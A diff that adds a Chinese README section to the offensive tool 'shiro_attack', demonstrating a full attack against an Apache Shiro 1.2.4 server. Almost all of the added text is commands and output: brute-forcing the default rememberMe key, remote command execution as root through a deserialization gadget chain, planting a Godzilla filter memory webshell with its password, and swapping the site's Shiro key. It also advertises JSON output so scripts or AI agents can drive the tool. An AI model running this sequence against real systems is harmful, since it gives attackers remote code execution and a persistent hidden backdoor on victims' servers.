@@ -196,6 +196,64 @@ AttackService 一行没改。它根本不知道自己在被 CLI 用。
 
 以 `{` 开头的是日志，否则是命令输出。脚本和 AI Agent 可以按行解析。
 
+### 拿一个真实目标跑一遍
+
+假设目标 `http://127.0.0.1:8080/login`，Shiro 1.2.4（CBC 模式），默认 Key：
+
+```bash
+JAR="shiro_attack-5.1.0-zulu-8-jfx.jar"
+CP="com.summersec.attack.CLI.MainCLI"
+T="http://127.0.0.1:8080/login"
+
+# 探测
+$ java -cp $JAR $CP detect -u $T
+[*] [++] 存在shiro框架！
+
+# 爆破 Key（字典文件放在工作目录的 data/shiro_keys.txt）
+$ java -cp $JAR $CP crack -u $T --cbc
+[*] [++] 存在shiro框架！
+[*] [++] 找到key：kPH+bIxk5D2deZiIxcaaaA== (CBC)
+[*] [+] 爆破结束
+
+# 指定 Key 验证（跳过字典爆破）
+$ java -cp $JAR $CP crack -u $T -K "kPH+bIxk5D2deZiIxcaaaA==" --cbc
+[*] [++] 找到key：kPH+bIxk5D2deZiIxcaaaA==
+[*] [+] 爆破结束
+
+# 执行命令（自动探测 Gadget + 回显）
+$ java -cp $JAR $CP exec -u $T -K "kPH+bIxk5D2deZiIxcaaaA==" -c "whoami" --cbc
+[*] [++] 发现构造链:CommonsBeanutilsString_183, 回显: AllEcho
+root
+
+# 指定 Gadget 和回显，跳过自动探测
+$ java -cp $JAR $CP exec -u $T -K "kPH+bIxk5D2deZiIxcaaaA==" \
+    -c "id" -g CommonsBeanutilsString_183 -e TomcatEcho --cbc
+uid=0(root) gid=0(root) groups=0(root)
+
+# 注入哥斯拉 Filter 内存马
+$ java -cp $JAR $CP memshell -u $T -K "kPH+bIxk5D2deZiIxcaaaA==" \
+    -t 哥斯拉[Filter] --pass SummerSec@2024
+[*] [注入结果] 成功
+[*] [类型] 哥斯拉[Filter]
+[*] [路径] http://127.0.0.1:8080/favicon.ico
+[*] [密码] SummerSec@2024
+[*] [密钥] 3c6e0b8a9c15224a
+
+# 替换 Shiro Key
+$ java -cp $JAR $CP changekey -u $T -K "kPH+bIxk5D2deZiIxcaaaA==" \
+    --newkey "FcoRsBKe9XB3zOHbxTG0Lw=="
+[*] [修改结果] 成功
+[*] [新 Key] FcoRsBKe9XB3zOHbxTG0Lw==
+
+# 用新 Key 验证
+$ java -cp $JAR $CP exec -u $T -K "FcoRsBKe9XB3zOHbxTG0Lw==" -c "whoami" --cbc
+root
+```
+
+GCM 模式的目标（Shiro >= 1.2.5）把上面命令里的 `--cbc` 换成 `--gcm`。
+
+需要被脚本或 AI 调的话加 `--json`。行首是 `{` 就按 JSON 解析日志元数据，否则是命令输出。
+
 ---
 
 ## AES 模式自动切换
